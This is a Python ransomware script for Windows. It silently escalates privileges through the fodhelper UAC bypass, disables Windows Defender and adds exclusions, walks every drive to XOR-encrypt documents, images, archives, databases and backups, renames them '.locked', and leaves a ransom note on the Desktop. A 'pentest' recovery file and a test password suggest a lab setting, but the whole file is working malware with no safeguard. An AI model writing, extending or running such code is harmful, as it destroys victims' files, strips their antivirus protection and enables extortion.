import os, sys, ctypes, subprocess, time, threading

UNLOCK_PASSWORD = "my-test-key-123"
TARGET_TYPES = ['.docx','.xlsx','.pptx','.pdf','.jpg','.png',
                '.mp4','.zip','.txt','.sql','.bak','.mp3']
SKIP_FOLDERS = ['windows', 'program files', 'programdata', 'appdata',
                'windows.old', '$recycle.bin', 'system volume information']

# ============ UAC BYPASS — SILENT ADMIN, NO POPUP ============
def bypass_uac():
    try:
        exe_path = sys.executable if getattr(sys, 'frozen', False) else f'python "{__file__}"'
        # fodhelper technique — no popup, works on Win 10 & 11
        subprocess.run(
            'reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command '
            '/v DelegateExecute /t REG_SZ /d "" /f',
            shell=True, capture_output=True
        )
        subprocess.run(
            f'reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command '
            f'/d "{exe_path}" /f',
            shell=True, capture_output=True
        )
        subprocess.run('fodhelper.exe', shell=True, capture_output=True)
        time.sleep(2)
        subprocess.run('reg delete HKCU\\Software\\Classes\\ms-settings /f',
                      shell=True, capture_output=True)
        os._exit(0)
    except:
        pass

# ============ KILL WINDOWS DEFENDER ============
def kill_defender():
    try:
        # Add exclusions
        paths = [os.path.expandvars(r'%USERPROFILE%'), 'C:\\',
                 sys.executable if getattr(sys, 'frozen', False) else __file__]
        for p in paths:
            subprocess.run(f'powershell -Command "Add-MpPreference -ExclusionPath \'{p}\'"',
                          shell=True, capture_output=True, timeout=10)
        # Disable everything
        cmds = [
            'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"',
            'powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true"',
            'powershell -Command "Set-MpPreference -DisableBlockAtFirstSeen $true"',
            'powershell -Command "Set-MpPreference -DisableIOAVProtection $true"',
            'net stop WinDefend /y',
        ]
        for c in cmds:
            subprocess.run(c, shell=True, capture_output=True, timeout=10)
    except:
        pass

# ============ LOCK A FILE ============
def lock_file(filepath):
    try:
        with open(filepath, 'rb') as f:
            data = f.read()
        key = UNLOCK_PASSWORD.encode() * 10
        locked = bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])
        with open(filepath, 'wb') as f:
            f.write(locked)
        os.rename(filepath, filepath + '.locked')
        return True
    except:
        return False

# ============ FIND ALL TARGET FILES ============
def find_files():
    files = []
    drives = []
    bitmask = ctypes.windll.kernel32.GetLogicalDrives()
    for letter in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ':
        if bitmask & 1:
            drives.append(f"{letter}:\\")
        bitmask >>= 1
    for drive in drives:
        try:
            for folder, subs, filenames in os.walk(drive):
                skip = any(sf in folder.lower() for sf in SKIP_FOLDERS)
                if skip:
                    subs[:] = []
                    continue
                subs[:] = [s for s in subs if s.lower() not in
                          ['windows', 'program files', 'programdata', 'appdata']]
                for name in filenames:
                    if os.path.splitext(name)[1].lower() in TARGET_TYPES:
                        files.append(os.path.join(folder, name))
        except:
            continue
    return files

# ============ DROP RANSOM NOTE ============
def drop_note():
    note = f"""
╔══════════════════════════════════╗
║        YOUR FILES ARE LOCKED     ║
╠══════════════════════════════════╣
║ UNLOCK CODE: {UNLOCK_PASSWORD}   ║
╚══════════════════════════════════╝
"""
    try:
        with open(os.path.expandvars(r'%USERPROFILE%\Desktop\HOW_TO_UNLOCK.txt'), 'w') as f:
            f.write(note)
    except:
        pass

# ============ MAIN LOCKER THREAD ============
def locker_main():
    all_files = find_files()
    locked = 0
    for i in range(0, len(all_files), 200):
        for fp in all_files[i:i+200]:
            if lock_file(fp):
                locked += 1
        time.sleep(0.01)
    drop_note()
    os.makedirs(os.path.expandvars(r'%TEMP%\pentest'), exist_ok=True)
    with open(os.path.expandvars(r'%TEMP%\pentest\recovery.txt'), 'w') as f:
        f.write(f"UNLOCK_PASSWORD={UNLOCK_PASSWORD}\nLocked {locked} files\n")

# ============ ENTRY POINT ============
def main():
    if not ctypes.windll.shell32.IsUserAnAdmin():
        bypass_uac()   # <-- NO POPUP, becomes admin silently
        return
    kill_defender()
    time.sleep(3)
    t = threading.Thread(target=locker_main, daemon=False)
    t.start()
    while True:
        time.sleep(10)

if __name__ == "__main__":
    main()